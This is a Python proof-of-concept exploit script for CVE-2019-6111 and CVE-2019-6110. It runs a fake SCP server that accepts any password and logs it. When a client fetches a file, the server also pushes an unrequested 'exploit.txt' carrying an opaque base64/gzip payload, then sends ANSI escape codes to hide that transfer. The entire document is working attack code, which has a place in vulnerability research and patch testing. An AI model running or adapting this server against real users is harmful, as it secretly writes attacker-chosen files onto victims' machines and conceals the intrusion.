import base64
import gzip
import logging
import paramiko
import paramiko.rsakey
import socket
import threading

logging.basicConfig(level=logging.INFO)

dummy = 'This is the file you requested.\n'
payload = gzip.decompress(base64.b64decode(
    b'H4sIAAa+QFwC/51VQW4CMQy85xV+AX+qqrZwoFSo0orbHvbQQw9NIiH1Af0YLyndjZ2x46'
    b'ygaIGs43jGTjIORJfzh3nIN/IwltH1b+LHeGdxHnXUsoCWD6yYyjt7AfA1XJdLDR8u5yRA'
    b'1/lEjiHbHGafXOMVpySuZaH4Jk1lgjxoocN5YMhRoNhhpA5EWMhlRHBNCWogZYhOnmk2V7'
    b'C4FJgwHxKSEwEzTskrQITtj1gYIurAhWUfsDbWIFyXlRwDc8okeZkCzNyjlMmcT4wxA39d'
    b'zp8OsJDJsGV/wV3I0JwJLNXKlOxJAs5Z7WwqmUZMPZmzqupttkhPRd4ovE8jE0gNyQ5skM'
    b'uVy4jk4BljnYwCQ2CUs53KtnKEYkucQJIEyoGud5wYXQUuXvimAYJMJyLlqkyQHlsK6XLz'
    b'I6Q6m4WKYmOzjRxEhtXWBA1qrvmBVRgGGIoT1dIRKSN+yeaJQQKuNEEadONJjkcdI2iFC4'
    b'Hs55bGI12K2rn1fuN1P4/DWtuwHQYdb+0Vunt5DDpS3+0MLaN7FF73II+PK9OungPEnZrc'
    b'dIyWSE9DHbnVVP4hnF2B79CqV8nTxoWmlomuzjl664HiLbZSdrtEOdIYVqBaTeKdWNccJS'
    b'J+NlZGQJZ7isJK0gs27N63dPn+oefjYU/DMGy2p7en4+7w+nJ8OG0eD/vwC6VpDqYpCwAA'
))

class ScpServer(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def check_auth_password(self, username, password):
        logging.info('Authenticated with %s:%s', username, password)
        return paramiko.AUTH_SUCCESSFUL

    def check_channel_request(self, kind, chanid):
        logging.info('Opened session channel %d', chanid)
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_channel_exec_request(self, channel, command):
        command = command.decode('ascii')
        logging.info('Approving exec request: %s', command)
        parts = command.split(' ')
        # Make sure that this is a request to get a file:
        assert parts[0] == 'scp'
        assert '-f' in parts
        file = parts[-1]
        # Send file from a new thread.
        threading.Thread(target=self.send_file, args=(channel, file)).start()
        return True

    def send_file(self, channel, file):
        '''
        The meat of the exploit:
            1. Send the requested file.
            2. Send another file (exploit.txt) that was not requested.
            3. Print ANSI escape sequences to stderr to hide the transfer of
               exploit.txt.
        '''
        def wait_ok():
            assert channel.recv(1024) == b'\x00'
        def send_ok():
            channel.sendall(b'\x00')

        wait_ok()

        logging.info('Sending requested file "%s" to channel %d', file,
            channel.get_id())
        command = 'C0664 {} {}\n'.format(len(dummy), file).encode('ascii')
        channel.sendall(command)
        wait_ok()
        channel.sendall(dummy)
        send_ok()
        wait_ok()

        # This is CVE-2019-6111: whatever file the client requested, we send
        # them 'exploit.txt' instead.
        logging.info('Sending malicious file "exploit.txt" to channel %d',
            channel.get_id())
        command = 'C0664 {} exploit.txt\n'.format(len(payload)).encode('ascii')
        channel.sendall(command)
        wait_ok()
        channel.sendall(payload)
        send_ok()
        wait_ok()

        # This is CVE-2019-6110: the client will display the text that we send
        # to stderr, even if it contains ANSI escape sequences. We can send
        # ANSI codes that clear the current line to hide the fact that a second
        # file was transmitted..
        logging.info('Covering our tracks by sending ANSI escape sequence')
        channel.sendall_stderr("\x1b[1A".encode('ascii'))
        channel.close()

def main():
    logging.info('Creating a temporary RSA host key...')
    host_key = paramiko.rsakey.RSAKey.generate(1024)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('localhost', 2222))
    sock.listen(0)
    logging.info('Listening on port 2222...')

    while True:
        client, addr = sock.accept()
        logging.info('Received connection from %s:%s', *addr)
        transport = paramiko.Transport(client)
        transport.add_server_key(host_key)
        server = ScpServer()
        transport.start_server(server=server)

if __name__ == '__main__':
    main()
